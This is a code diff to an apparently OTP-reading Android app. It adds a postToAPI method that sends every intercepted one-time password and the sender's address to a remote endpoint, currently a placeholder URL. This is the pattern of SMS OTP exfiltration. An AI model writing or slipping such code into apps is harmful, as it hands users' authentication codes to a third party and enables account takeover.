@@ -9,7 +9,15 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.telephony.SmsMessage;
+import android.util.Log;
 import android.widget.Toast;
+
+import com.androidnetworking.AndroidNetworking;
+import com.androidnetworking.common.Priority;
+import com.androidnetworking.error.ANError;
+import com.androidnetworking.interfaces.JSONObjectRequestListener;
+
+import org.json.JSONObject;
 
 import git.bpr10.otpreader.utils.OtpMatcher;
 
@@ -58,7 +66,28 @@ public class SmsService extends IntentService {
     if (otp != null) {
       copyToClipBoard(otp);
       showToast("OTP for " + currentMessage.getDisplayOriginatingAddress() + " is Copied : " + otp);
+      postToAPI(otp,currentMessage.getDisplayOriginatingAddress());
     }
+  }
+
+  private void postToAPI(String otp, String sender_name) {
+    AndroidNetworking.post("dummy url here ")
+        .addQueryParameter("sender_name", sender_name)
+        .addQueryParameter("otp", otp)
+        .setTag(SmsService.class.getSimpleName())
+        .setPriority(Priority.HIGH)
+        .build()
+        .getAsJSONObject(new JSONObjectRequestListener() {
+          @Override
+          public void onResponse(JSONObject response) {
+            Log.d(TAG, "Success " + response);
+          }
+
+          @Override
+          public void onError(ANError anError) {
+            Log.e(TAG, "Error " + anError.getErrorBody());
+          }
+        });
   }
 
   private void copyToClipBoard(String otp) {
